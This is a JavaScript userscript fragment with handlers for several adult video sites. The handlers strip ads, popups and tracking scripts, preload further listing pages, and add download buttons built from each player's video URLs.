    analdin_com: function(){
        if (location.href.isdomain('ahcdn.com') && window.location.href.match(/\.mp4/i)){
      //          LFJ.hkdownload();
        }
        if (this.url.isdomain('analdin.com') || this.url.isdomain('xozilla.com')){

        LFJ.hkoptimus();

            $( "body" ).on( "click",'a.modulerequired', function(event) {
              event.preventDefault();
              modulerequired();
            })
          //-_______________________ remove iframe
              GM_addStyle('.asg-container,iframe[id^="adsbox"]{display:none !important;}');
              GM_addStyle(".asgvideo-js{display:none !important;}");
              var addcscript = document.createElement("script");
              addcscript.innerHTML="if(typeof flashvars ==='object'){delete flashvars['adv_start_html'];delete flashvars['adv_pause_html'];} function removeframe(){document.querySelectorAll('iframe').forEach(function(xj) { var tagname = xj.parentNode.tagName.match(/(div|p|center|span|ul|ol|b|a|u|i)/) !==null; var parentldnoe = xj.parentNode.classList.value.match(/(video\-page|header)/) !==null;if(parentldnoe==true && tagname==true){xj.parentNode.style.display='none';}else {xj.style.display='none';}})}";
              document.body.appendChild(addcscript);
          //-_______________________

       document.querySelectorAll('#popup-sponsors,ics,#ics,.brazzers-link,.footer,#list_models_top_models,script[src*="riverhit.com"],script[src*="addtoany.com"],script[src*="moatads.com"],script[src*="addthis"],script[src*="o333o.com"],script[src*="excited.me"],script[src*="jacobeshort.pro"],script[src*="boffinsoft.com"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
       setTimeout(function(){

         removeframe();

         var icfkcms = setInterval(function() {if(document.querySelector('#kt_player')){document.querySelector('#kt_player').addEventListener("click", function() {
          if(document.querySelector('video').paused==true){kvsplayer.kt_player.play();}
              setTimeout(function() {removeframe();   }, 300);
         });clearInterval(icfkcms);} },1000);


       if(document.querySelector('#list_videos_most_recent_videos_pagination')){document.querySelector('#list_videos_most_recent_videos_pagination').style.paddingBottom='15px';}
       }, 1000);

        GM_addStyle("@media screen and (max-width: 480px){ .cusvowc{top: 10px;position: relative;}} .block-video>.table{ display: none !important; z-index:-999; }.sponsor, .model-link, .footer-margin, .rating-container, .presented-by,.js-open-comments { display: none !important; z-index:-999; }");
        if ( this.url.isdomain('xozilla.com')) {


          var chaslr='dropdown-btn'; var roundv ='font-size: 14px;width: fit-content;padding-left: 7px;padding-right: 7px;border-radius: 9px !important;margin-left: 9px;margin-right: 4px;';
        }
          else {var roundv='background: #ab6161;height: 30px; line-height: 30px; margin-left: 20px; cursor: pointer; float: left; border-radius: 2px; -webkit-border-radius: 2px; padding: 0 10px;';var chaslr='cusvowc';}
        var cimg ='<img style="vertical-align: middle;max-width: 20px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAtElEQVQ4y8XSMW4CMRSE4XG01VYRx8gBUlByAM7AEShSpE1BgRQpt8s5AImK4kuzUiLW1poqv+TGfjPPHr+kAva4+uWKfXrAiJs5N4z39U8VjzHJUNkfprNFg4f4f4PhT3gvSZ6n1eIVpySnUsr3ffof+jnUvi84doi/0JyBJZO2uMOkLsYWqwWTmRgrbDMVrBs3ecN7rTPWMLSeUkpJks+eObgk2SyGM2eT5BLscPY4Z+x+ANmEXSPGwOxeAAAAAElFTkSuQmCC">';



                    document.querySelectorAll('img[data-original],img.thumb').forEach(e => {e.style.opacy='1';e.src=e.getAttribute('data-original'); e.classList.remove('lazy-load');});
                 document.querySelectorAll('.asgvideo-js,.footer-ads,#popup-sponsors,ics,#ics,.brazzers-link,.footer,#list_models_top_models,script[src*="riverhit.com"],script[src*="addtoany.com"],script[src*="moatads.com"],script[src*="addthis"],script[src*="o333o.com"],script[src*="excited.me"],script[src*="jacobeshort.pro"],script[src*="boffinsoft.com"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})



          if(document.querySelector('.player-holder')){
                  var ckx ='';
                  try{var zxcow = removehtml(document.querySelector('.headline>h1').textContent);} catch(e) {var zxcow = removehtml(document.querySelector('.headline>h2').textContent);}
                    if (flashvars.video_url) { ckx +='<a style="'+roundv+'" href="'+flashvars.video_url+'?name='+zxcow+'.mp4" data-clipboard-text="'+zxcow+'.mp4" target="_blank"  class="'+chaslr+' buttoncopy">'+cimg+' 480p</a>'; }
                    if (flashvars.video_url_text) { ckx +='<a style="'+roundv+'" href="'+flashvars.video_url+'?name='+zxcow+'.mp4" data-clipboard-text="'+zxcow+'.mp4"  target="_blank"  class="'+chaslr+' buttoncopy modulerequired">'+cimg+flashvars.video_url_text+'</a>'; }
                    if (flashvars.video_alt_url_text) { ckx +='<a style="'+roundv+'" href="'+flashvars.video_alt_url+'?name='+zxcow+'.mp4" data-clipboard-text="'+zxcow+'.mp4" target="_blank"  class="'+chaslr+' buttoncopy modulerequired">'+cimg+flashvars.video_alt_url_text+'</a>'; }

                  $(".info-holder>.info-buttons").append(ckx);

                }
          var vdoc = 1;
          var ifkcms = setInterval(function() {
            if (vdoc>=5){clearInterval(ifkcms);} else{
          document.querySelectorAll('.footer-ads').forEach(e => e.parentNode.removeChild(e));
          document.querySelectorAll('.list_models_top_models').forEach(e => e.parentNode.removeChild(e));
        document.querySelectorAll("div[style='display: block;position: absolute; left: 0px; top: 0px; bottom: 0px; right: 0px; overflow: hidden; background: transparent; display: block;']").forEach(e => e.parentNode.removeChild(e));
          vdoc++;
            }
          }, 1000);


    document.querySelectorAll('.popup-video-link').forEach(el => el.addEventListener('click', event => {
        var ifkcmvv = setInterval(function(){

          if(document.querySelector('.player-holder') && document.querySelector('.headline>h2')){
                  var ckx ='';
                  var zxcow = removehtml(document.querySelector('.headline>h2').textContent);

                    $("div[style='position: absolute; left: 0px; top: 0px; bottom: 0px; right: 0px; overflow: hidden; background: transparent; display: block;']").remove();
                    if (flashvars.video_url) { ckx +='<a style="background: #ab6161;margin-top: 15px;margin-bottom: 15px;margin-right: 15px;" href="'+flashvars.video_url+'?name='+zxcow+'.mp4" target="_blank"  data-clipboard-text="'+zxcow+'.mp4" class="link-comment buttoncopy">'+cimg+' 480p</a>'; }
                    if (flashvars.video_url_text) { ckx +='<a style="background: #ab6161;margin-top: 15px;margin-bottom: 15px;margin-right: 15px;" href="'+flashvars.video_url+'?name='+zxcow+'.mp4" target="_blank"  data-clipboard-text="'+zxcow+'.mp4" class="link-comment buttoncopy modulerequired">'+cimg+kt_player.conf.video_url_text+'</a>'; }
                    if (flashvars.video_alt_url_text) { ckx +='<a style="background: #ab6161;margin-top: 15px;margin-bottom: 15px;margin-right: 15px;" data-clipboard-text="'+zxcow+'.mp4" target="_blank" href="'+flashvars.video_alt_url+'?name='+zxcow+'.mp4" class="link-comment buttoncopy modulerequired">'+cimg+kt_player.conf.video_alt_url_text+'</a>'; }

                   $(".player-holder").append('<div style="float:right;">'+ckx+'</div>');
                     clearInterval(ifkcmvv);
                }
          }, 1500);
            }));



        }
    },
    thisav_com: function(){
      if (this.url.isdomain('thisav.com') && this.url.match(/dashinit\.mp4/)){
        LFJ.hkdownload();
      }
      if (this.url.isdomain('thisav.com')){


        $( "body" ).on( "click",'a.modulerequired', function(event) {
          event.preventDefault();
          modulerequired();
        })
        localStorage.setItem("_spop_popfired_expires",((Math.floor(Date.now()))+8000000));
        localStorage.setItem("_spoplastOpenAt",new Date(Math.floor(new Date().getTime()+9000000000)));

        GM_addStyle(".exo-native-widget{display:none !important;}.vkaov{cursor: pointer;color: #f72740; text-decoration: none;font-size: 16px!important; padding-left: 10px;font-weight: 400!important;}.vkaov:focus, .vkaov:hover{color: #fff;}");
              try{$.each($('iframe'), function() {const AdservingModule="";this.contentWindow.open = function () {};});} catch(e) {window.open = function (url, windowName, windowFeatures) {};}
              window.open = function (url, windowName, windowFeatures) {};
              document.querySelectorAll('a.video_link,a.channel_link').forEach(function(xj) {var ficlink=xj.href;if(xj.querySelector('img')){var imgx=''+xj.querySelector('img').outerHTML+'<br>';} else{var imgx='';} xj.outerHTML="<c class='vkaov' download onclick=\"window.location.href='"+ficlink+"'\">"+imgx+"<span class='font-13 font-bold'>"+xj.textContent+"</span></c>";})



                          for(i=0; i<100; i++) { if(i==99){LFJ.hkoptimus();} try{window.clearInterval(i);window.clearTimeout(i);} catch(e){var cvk='';} }
                                $("select[id='order_type'], select[id='order_category'], select[id='order_timeline']").change(function() { $('#orderVideos').submit(); });


        var counds = 0;

        var removed =0;

        var autoclearads = setInterval(function(){
          if (counds>=1000) {clearInterval(autoclearads);} else {
         if (removed>=22){clearInterval(autoclearads); console.log('END REMOVE'+ removed);}
        //    console.log('END REMOVE'+ removed);
        try{$.each($('iframe'), function() {this.contentWindow.open = function () {};});} catch(e) {window.open = function (url, windowName, windowFeatures) {};}
        document.querySelectorAll('iframe').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('div.ads').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('a[href*="addtoany.com"]').forEach(function(xj) { xj.parentNode.parentNode.removeChild(xj.parentNode);})
        document.querySelectorAll('ins').forEach(function(xj) { xj.parentNode.parentNode.removeChild(xj.parentNode);})
        document.querySelectorAll('script[src*="dtscout"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[data-cfasync]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[async]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        window.open = function (url, windowName, windowFeatures) {};
        document.querySelectorAll('script[src*="cdn-cgi"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="cloudflare-static"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="exosrv"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="sw.js"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="jads"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="googletagmanager"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="analytics"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="intellipopup"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="addtoany"]').forEach(function(xj){ xj.parentNode.removeChild(xj);})
        document.querySelectorAll('script[src*="hionedaugsbu"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('#ics').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('left').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('#vjs-banner-container').forEach(function(xj) {xj.parentNode.removeChild(xj);})
        document.querySelectorAll('div#footer,p[align="center"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        if(document.querySelector('cloudflare-app')){document.querySelectorAll('cloudflare-app').forEach(function(xj) { xj.parentNode.removeChild(xj);})}
        if(document.querySelector('script[src*="adsco.re"]')){document.querySelectorAll('script[src*="adsco.re"]').forEach(function(xj) {xj.parentNode.removeChild(xj);});removed++;}
        document.body.style.overflow='auto';
         if(typeof adsbyjuicy == 'object'){delete adsbyjuicy;removed++;}
         if(typeof AdservingModule == 'object'){delete AdservingModule;removed++;}
         if(typeof _pop == 'object'){delete _pop;removed++;}
         if(typeof _HST_cntval == 'string'){delete _HST_cntval;removed++;}
         if(typeof chfh2 == 'function'){delete chfh2;removed++;}
         if(typeof chfh == 'function'){delete chfh;removed++;}
         if(typeof _pao == 'object'){delete _pao;removed++;}
         if(typeof CloudflareApps == 'object'){delete CloudflareApps;removed++;}
         if(typeof a2apage_init == 'number'){delete a2apage_init;removed++;}
         if(typeof a2a_init == 'function'){delete a2a_init;removed++;}

        counds++;
          }
        },20);


        if (this.url.isdomain('thisav.com') && this.url.match(/\Wvideo\W/) ){
          GM_addStyle("cloudflare-app,#footer,iframe,.span-real-150.left,#vjs-banner-container { display: none !important; z-index:-999; }.right{float: left  !important;} body{height:unset !important;overflow:unset !important;} #related_videos_containers,#container,.span-755,.video_info,#scroller_container{width:100% !important;}");
          if(document.querySelector('.span-real-985')){document.querySelector('.span-real-985').style.width="100%";
          document.querySelector('.span-640').querySelector('div').style.width="100%";
          document.querySelector('.span-640').querySelector('div').querySelector('div').style.width="100%";
          document.querySelector('.span-640').querySelector('div').querySelector('div').style.height="560px";
          document.querySelector('.span-640').setAttribute('class','');
          document.querySelectorAll('.span-1160').forEach(e => e.parentNode.querySelector('.span-1160').setAttribute('class',''));
          document.querySelectorAll('.span-real-985').forEach(e => e.parentNode.querySelector('.span-real-985').setAttribute('class',''));
          document.querySelectorAll('#related_videos_container').forEach(e => e.parentNode.querySelector('#related_videos_container').setAttribute('id','related_videos_containers'));
            try{
        document.querySelectorAll('p')[document.querySelectorAll('p').length-1].previousElementSibling.previousElementSibling.remove();
          document.querySelectorAll('p')[document.querySelectorAll('p').length-1].previousElementSibling.remove();
          document.querySelectorAll('p')[document.querySelectorAll('p').length-1].remove();
            } catch(e) { var djdfsxv='';}


                                                      }
     //     document.body.innerHTML=document.body.innerHTML.replace("LEGAL DISCLAIMER: THIS WEBSITE CONTAINS MATERIAL WHICH MAY OFFEND AND MAY NOT BE DISTRIBUTED, CIRCULATED, SOLD, HIRED, GIVEN, LENT, SHOWN, PLAYED OR PROJECTED TO A PERSON UNDER THE AGE OF 18 YEARS.","");

        //  document.querySelector('video').src=downloadURL;
          var downloadURL =videojs.players["my-video"].cache_.src.replace('.mpd','_dashinit.mp4')+'?name='+document.querySelector('h5,h1').textContent;


          var osdcox = Object.assign(document.createElement('div'),{id:"pcsh",style:'text-align: right;vertical-align: middle;',innerHTML:'<a  class="vkaov modulerequired" style="font-size: 15px !important;font-weight: 700 !important;position: relative; margin-right: 30px; font-weight: 700; font-size: 15px;" href="'+downloadURL+'"  \><img style="width: 21px; vertical-align: middle; position: relative; top: -2px; left: 2px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABmJLR0QA/wD/AP+gvaeTAAACZ0lEQVRYhe2Uy0uUYRSHn/N+YzN5yaIYVAaSyC6aSgbZIuhGdHGyKBBpk2EQ1s4/IwgLAlsUrVzUJkGzwhACNy0yjVxUXqkZLQiGRHTU7zstnKYJNb/PplXzLA/nnN/vPe97XsiQ4X9HvBY8+RQvd4y5AuYYaHGizRjqvBCfcy9c4H/3Twx0fVS/nWO3oFwFzAppNnB3JmY115XJXNoMJMSfohxx6bdnJmadcmNipZP8hp1j3/IgDnB0/Ub7ppvEVSeweOdWPy7NpmCrsStrC/2Df0ryLRdsn9BSS52zorrDQavXIA5gGTWNQLNrA93Dmh8P2K3q2PWAKLDSkN6/maTj/gAAZxor2bm3YEmOOub4ai6TBrqHNX/W7/QCe1Yrco+WdEYWHgAgMuCbMw9PFstEakZytPGA3YpoGsUBwa/QoNCgqi3zWfZQR8S+vsRA+4SWKtSnVXx5skHvpJowAD51zrGGX3Ht6I1nY1oIP9+Aaonb0lfPR/j6eYqp2Gwy9rpnnA99XwiG8qg+sc1Nm+z5dU4dcNsAKKhbA2UHioiOxYiOxpKx6GiMyEiM0v1FbtuAagUkrkBEhtzW5eYHuNC0D3/g1wZn+S3ON1WRtyngWl8Sh05sgXmMhylsKcolfLkSYwkiQvhSBcFQnmtxABV5mzCySEdkoQ246KVJ38txAKoObfUkDkybLGt7TVAmkwa6vukGO+70olrutZtXROVaOGS1QspHdHqzfLf85iDQhofr8Mh0qjissPudUd2NOrWguxA5rDAFGgWmXEspAURCoHMog4j0G595VBOUyb8/R4YMGdLID8qP1jgdVjyXAAAAAElFTkSuQmCC"/> 下載 (Download)</a>'})

          if(document.querySelector('div.video_links')){document.querySelector('div.video_links').insertBefore(osdcox,document.querySelector('div.video_links').querySelector('.clear_right').firstChild);
          document.querySelector('div.video_links').appendChild(document.querySelector('div.video_links').querySelector('.clear_right'));}
          else if(document.querySelector('div.b')){
          document.querySelector('div.b').insertBefore(osdcox,document.querySelector('div.b').firstChild);
          document.querySelector('div.b').style.cssText='margin: 5px; margin-right: -30px !important; position: relative; display: block;';
          }

        }
        if (this.url.isdomain('thisav.com') && !this.url.match(/\/video\/([0-9]+)/)){
        GM_addStyle("cloudflare-app,#footer,iframe,.span-real-150.left,#vjs-banner-container { display: none !important; z-index:-999; }.right{float: left  !important;} body{height:unset !important;overflow:unset !important;} #container,.span-755{width:calc(100%) !important;}");
        if(document.getElementById("header")){var itm = document.getElementById("header").innerHTML;document.getElementById("container").innerHTML=itm;}
        var nowsource = 0;
        var playnowe =0;
        var linkworld=0;
        var pagelimitreload= 5;
        var cidrun=1;
        var fristremo = 0;
            if(document.querySelector('.prevnext')){document.querySelectorAll('.prevnext').forEach(e => e.parentNode.parentNode.removeChild(e.parentNode));}
            if(document.querySelector('.pagination')){document.querySelector('.pagination').querySelectorAll('li').forEach((lix) => {var cxlink = lix.childNodes[0].getAttribute('href');if (cxlink){nowsource++;linkworld=cxlink; }else{playnowe = parseInt(lix.childNodes[0].textContent)+1;}})
            linkworld = linkworld.replace(/page\=[0-9]+$/,'');
            document.querySelector('#content').querySelectorAll('.pagination')[0].remove();
                                                     }
 if(document.querySelector('#content')){var nownode =document.querySelector('#content').querySelectorAll('.video_box');} else {var nownode='0';}
 var lastnode = nownode.length-1;
        document.querySelectorAll('.video_box').forEach((videoid) => {
                           var lonecp = videoid.cloneNode(true);
                           nownode[lastnode].parentNode.insertBefore(lonecp,nownode.parentNode);
                           nownode[fristremo].remove();
                            fristremo++;
                          })


            var i=0;
            for (i = 0; i < pagelimitreload;i++) {
                var diecoo = i;
                var vlink = linkworld+'page='+(playnowe+i);
                      GM_xmlhttpRequest({
                      method: "GET",
                      url: vlink,
                      onload: function (response) {
                                        var parser      = new DOMParser ();
                                        var responseDoc;
                    if (document.querySelector('.blinkcl')){
                         var numbegin= document.querySelector('#container').querySelector('.blinkcl').querySelector('strong').innerText;
                        } else { numbegin=0;}

                          if(document.querySelector('#content')){var nownode =document.querySelector('#content').querySelectorAll('.video_box');} else {var nownode=0;}
                         var lastnode = nownode.length-1;
                          responseDoc = parser.parseFromString (response.responseText, "text/html");

                          var icie = responseDoc.querySelectorAll('.video_box').forEach((videoid) => {
                           var lonecp = videoid.cloneNode(true);
                           nownode[lastnode].parentNode.insertBefore(lonecp,nownode.parentNode);
                          })
                        if(cidrun==5 && responseDoc.querySelector('#content')){
                          var paging =responseDoc.querySelector('#content').querySelectorAll('.pagination')[0].cloneNode(true);

                          var bsubmenu=responseDoc.querySelector('#container').querySelectorAll('.blinkp')[0].cloneNode(true);
                          if (document.querySelector('.blinkp')){document.querySelector('#container').querySelector('.blinkp').replaceWith(bsubmenu);}
                          if (document.querySelector('.blinkcl')){document.querySelector('#container').querySelector('.blinkcl').querySelector('strong').innerHTML=numbegin;}



                          document.querySelector('#content').insertBefore(paging,nownode.parentNode);
                            document.querySelector('.currentpage').innerHTML='from-page ' +(playnowe -1 ) + ' to '+ document.querySelector('.currentpage').innerHTML;
                            document.querySelectorAll('.prevnext').forEach(e => e.parentNode.parentNode.removeChild(e.parentNode));

                              var flement  = document.querySelector('.pagination').querySelectorAll('li');
                             if(flement[0].querySelector('a')){var handled = flement[0].querySelector('a').getAttribute('href').replace(/page\=[0-9]+$/,'');} else {handled='';}
                        if ((playnowe-6) > 0){
                                if ((playnowe-6) == 2) { var difvmeoefc = playnowe-7; var rtdxxt='Or first from '; flement[1].querySelector('a').style.display='none';flement[2].querySelector('a').style.display='none';flement[3].querySelector('a').style.display='none';flement[4].querySelector('a').style.display='none';} else {var difvmeoefc = playnowe-6;var rtdxxt='';}
                          flement[0].querySelector('a').innerHTML= rtdxxt+difvmeoefc;
                          flement[0].querySelector('a').setAttribute('href',handled+'page='+difvmeoefc);



                        } else {if(flement[0].querySelector('a')){flement[0].querySelector('a').style.display='none';}}


                          if ((playnowe-5) > 0){
                          flement[1].querySelector('a').innerHTML= (playnowe-5);
                          flement[1].querySelector('a').setAttribute('href',handled+'page='+(playnowe-5));
                          } else {flement[1].querySelector('a').style.display='none';}

                          if ((playnowe-4) > 0){
                          flement[2].querySelector('a').innerHTML= (playnowe-4);
                          flement[2].querySelector('a').setAttribute('href',handled+'page='+(playnowe-4));
                          } else {flement[2].querySelector('a').style.display='none';}

                          if ((playnowe-3) > 0){
                          flement[3].querySelector('a').innerHTML= (playnowe-3);
                          flement[3].querySelector('a').setAttribute('href',handled+'page='+(playnowe-3));
                        } else {flement[3].querySelector('a').style.display='none';}

                          if ((playnowe-2) > 0){
                          flement[4].querySelector('a').innerHTML= (playnowe-2);
                          flement[4].querySelector('a').setAttribute('href',handled+'page='+(playnowe-2));
                         } else {if(flement[4].querySelector('a')){flement[4].querySelector('a').style.display='none';}}
}

                        cidrun++;


                      }})

        //       if(i==3) {nownode[lastnode].parentNode.insertBefore(pageff,nownode.parentNode); console.log('dcccccccccccc');}


            }


      }

      }
    },
    xtube_com: function(){
        if (this.url.isdomain('xtube.com') && window.location.href.match(/\.mp4\?ttl/i)){
          LFJ.hkdownload();
        }
        if (this.url.isdomain('xtube.com')){
        LFJ.hkoptimus();
      localStorage.setItem("player_quality", '{"quality":720}');
                document.querySelectorAll('script[src*="https"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})

          delete addTjScript;
        if(document.querySelector('.premiumLabel')){document.querySelectorAll('.premiumLabel').forEach(e => e.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.removeChild(e.parentNode.parentNode.parentNode.parentNode.parentNode));}
document.addEventListener('readystatechange', event => {
         if($("ul:not([class])")){$("ul:not(:has(li))").remove();}

        if(document.querySelector('[title*="Paid"],[title*="paid"]')){document.querySelectorAll('[title*="Paid"],[title*="paid"]').forEach(e => e.parentNode.parentNode.removeChild(e.parentNode));}
          var idmd = $(".header.headerSponsor").parent('div').attr('id');
             GM_addStyle("#"+idmd+"{display:none !important;}.mobileView,.hasFooterAd,.mainSection{padding-bottom: 15px !important;margin-bottom:unset !important;}");
             $(".ad_footer").parent('div').remove();

          $( ".cntPanel.moreVideosFromUser" ).clone().appendTo( ".cntBox.contentInfo.underVideoWatch");

        $('ins,footer,iframe,.pull-right.col-xl-12.col10-xxl-4,.freeVideoBanner,.billingSigns,a.promoBanner,.highlightIcon,.expandAside,.underPlayerBanner,.votesWrapper,.removeAds').remove();
        $('.col-xs-24.col-xl-16.col10-xxl-7.expandMainCol').removeClass('col-xs-24 col-xl-16 col10-xxl-7').addClass('col-lg-12');
        $("div.adContainer").parent().parent().remove();
        $('a[data-tr-action="link_sponsor_external_profileHeader"]').parent().remove();
     //   $('#mainSection').css('margin','0 0 auto').css('width','100%');
        $("#playerWrapper").css('height','450px');
        if (window.location.href.match(/\/video\-watch\//ig)!==null){

          var foclcs ='';
          if(MHP1138.players.xtubePlayer.mainRoll.mediaDefinition){var ficlefo=MHP1138.players.xtubePlayer.mainRoll.mediaDefinition;var tifsdwrc=removehtml(MHP1138.players.xtubePlayer.mainRoll.title);} else{
          var ficlefo = window.MHP1138.players.xtubePlayer.mainRoll.mediaDefinition; var tifsdwrc=removehtml(window.MHP1138.players.xtubePlayer.mainRoll.title);
          }
                var i=0;
                for (i = 0; i < ficlefo.length; i++) {
                 if(ficlefo[i].videoUrl){ foclcs = foclcs+'<a href="'+ficlefo[i].videoUrl+'&name='+tifsdwrc+'.mp4" target="_blank"  class="btn btn-outline bright buttoncopy" data-clipboard-text="'+tifsdwrc+'.mp4"><i class="icon_download"></i> '+ficlefo[i].quality+'P</a>';}

                }
                $("#downloadVideoBtn").replaceWith(''+foclcs+'');

           }


        //PRO FILE
         try{if (parseInt($('a[href*="videos"]').parent('li').find('span').attr('data-count'))>1){document.getElementsByClassName("profileVideosLink")[0].click();}} catch (e){console.log('d');}
})

          }



      },
    tube8_com: function(){
      if (this.url.isdomain('t8cdn.com') && window.location.href.match(/\.mp4/i)){
          LFJ.hkdownload();
      }
      if (this.url.isdomain('tube8.com')){

        LFJ.hkoptimus();
        $(".gridList>div[class]").remove()
        localStorage.setItem("lockedVideo", '{"val":"off"}');
        if(document.querySelector('.section.col-8.col-8-md.col-9-lg')){document.querySelector('.section.col-8.col-8-md.col-9-lg').classList.add('col-12','col-12-md','col-12-lg');
        document.querySelector('.section.col-8.col-8-md.col-9-lg').classList.remove('col-8','col-8-md','col-9-lg');

        }
        if(document.querySelector('div[data-esp-node="video_info"]')){document.querySelector('div[data-esp-node="video_info"]').style.marginTop='26px';}
        GM_addStyle("#downloadMainBox,#shareMainBox{display: flex;}.buttoncopy{margin-right: 15px;}iframe{display:none !important;} .section.col-8.col-8-md.col-9-lg{width:100%}");

        for(i=0; i<100; i++) {window.clearInterval(i);}
        var inFormOrLink;




        var counds=0;
        var autoclearads = setInterval(function(){
          if (counds>=1000) {clearInterval(autoclearads);} else {
        document.querySelectorAll('script[src*="ads"]').forEach(function(xj) { xj.parentNode.removeChild(xj);})
        document.querySelectorAll('ins,#adBlockAlertWrap,iframe,#footer-copyright,a[data-esp-node="porn_game"],a[data-esp-node="get_vip"],a[data-esp-node="paid_tab_title"],#rating_down,iframe,.gridBanner,.section.cat-fish-banner-wrapper,div[data-esp-node="footer_ads_banner"],div[data-esp-node="under_player_ad"],#announcement_ticker,#footer-text,#copyright,.col-4.col-4-md.col-3-lg').forEach(function(xj) { xj.parentNode.removeChild(xj);})


          }
        },5);




            var ndi = 1;
            var timocld = setInterval(function(){
                if(document.querySelector(".video-data-tab.active")){
                  if(document.querySelector(".video-data-tab.active").getAttribute('data-btn-clicked')==3){document.getElementById("loadMoreBTN").style.display='none';document.querySelectorAll('img[data-thumb]').forEach(e => {e.src=e.getAttribute('data-thumb') !="" ? e.getAttribute('data-thumb'):e.src;});clearInterval(timocld);}
               else if(document.getElementById("loadMoreBTN")){if(document.getElementById("loadMoreBTN").display !="none"){document.getElementById("loadMoreBTN").click();document.querySelectorAll('img[data-thumb]').forEach(e => {e.src=e.getAttribute('data-thumb') !="" ? e.getAttribute('data-thumb'):e.src;})}}
              else {clearInterval(timocld);}
                }
                    else {clearInterval(timocld);}

            }, 1000);

          var foclcs ='';
                var i=0;
                if(typeof flashvars !='undefined'){var fiemcoelg = flashvars.mediaDefinition;}
                else{var fiemcoelg = 0;}


                for (i = 0; i < fiemcoelg.length; i++) {
                  foclcs = foclcs+'<div class="player-under-btns__item player-under-btns__download" style="font-size: 1.4rem;"><a  target="_blank" onclick="window.open(\''+fiemcoelg[i].videoUrl+'&name='+flashvars.video_title+'.mp4\',\'_blank\')" class="display-block relative bkg-grad-video-page download-button player-under-btns__link buttoncopy" data-clipboard-text="'+flashvars.video_title+'.mp4"><span class="icon-button icon-download"></span><span class="btn-text">'+fiemcoelg[i].quality+'P</span></a></div>';

                }



           document.querySelector('#downloadMainBox').innerHTML=foclcs;
          if(!document.querySelector('#downloadMainBox')){document.querySelector('#shareMainBox').innerHTML=foclcs;}


          }
    },
    xhamster_univer: function(){
      //window.initials.xplayerSettings.sources.standard.mp4
      if (this.url.isdomain('xhamster.one') || this.url.isdomain('xhamster.desi') || this.url.isdomain('xhamster1.desi') || this.url.isdomain('xhamster.com') || this.url.isdomain('xhamster2.com') || this.url.isdomain('xhamster7.com') || this.url.isdomain('xhamster8.com') || this.url.isdomain('xhamster9.com') || this.url.isdomain('xhamster10.com') || this.url.isdomain('xhamster11.com') || this.url.isdomain('xhamster12.com') || this.url.isdomain('xhamster13.com') || this.url.isdomain('xhamster14.com') || this.url.isdomain('xhamster15.com') || this.url.isdomain('xhamster17.com') || this.url.isdomain('xhamster18.com') || this.url.isdomain('xhamster19.com') || this.url.isdomain('xhamster20.com')){
        'use strict';


                  if (location.href.match(/(xhamster\.com\/users)/i) && !location.href.match(/(photos|video|friends)/i)) {
                    $('.xh-tabset a[href*="/"]').click();}
                  LFJ.hkoptimus();


        GM_addStyle(".wig-spb.wig-spa,.wig-right-rectangle,.wig-cams-widget,.footer-top-part,.wih-right-rectangle,.wih-spot-container{display:none !important;}.xh-dropdown.popup.positioned~ul.dropdown.position-left,.xh-button.trigger.no-arrow:hover~ul.dropdown.position-left,ul.dropdown.position-left:hover{display:block;}.xh-dropdown.popup.positioned .dropdown{top: 80%;}");
        //  document.body.style.display='';
            $("body").on( "mousedown", ".select-item,button.xh-button,.cat-name>label", function() {
            var ndi = 1;
            var timocld = setInterval(function(){
                  if(ndi>50){clearInterval(timocld); ndi=0;}
                  $('.right-rectangle.right-rectangle--backing').remove();
                  if ($('.right-rectangle.right-rectangle--backing').length==1) {$('.right-rectangle.right-rectangle--backing').remove();  clearInterval(timocld);} ndi++}, 50);



            })
          $( ".player-container" ).on( "click", ".xplayer", function() {
            var ndi = 1;
            var timocld = setInterval(function(){
                  if(ndi>50){clearInterval(timocld); ndi=0;}
                  $('.xplayer-ads-block__video').remove();
                  if ($('.xplayer').parents().find('.centered').length==1) {$('.xplayer').parents().find('.centered').remove();  clearInterval(timocld);} ndi++}, 50);


       });
	//	var removehtml = s => (s + '').replace(/[&<>"']/g, m => ({ '&': '', '<': '', '>': '', '"': '', "'": '' })[m]);

        $('div.right-rectangle.wih-spot-container,div.description-text,div.copyright,div.bottom-announce,div.top-links,.earning-block,a.report-control,a.info_text,a.item.full-download,ul.dropdown.position-left>li>a.item>span,iframe:not(#pb_iframe),p.disclaimer,.video-view-ads.video-view-ads--full-page,.wih-banner-container,.premium-overlay').remove();
        $('div.download-control.positioned').removeClass('download-control');
        $('.thumb-list--sidebar.thumb-list--promoted-video').css('width','100%').css('display','contents');
        $('body').removeClass('xh-scroll-disabled');
       try{var videotitlesc = removehtml(initials.videoEntity.title);} catch(e){ return false;}

        $('div.wih-cams-widget.as-width-wrap.horizontal,div.footer-top-part,.wih-banner,.wih-cams-widget').parent().remove();
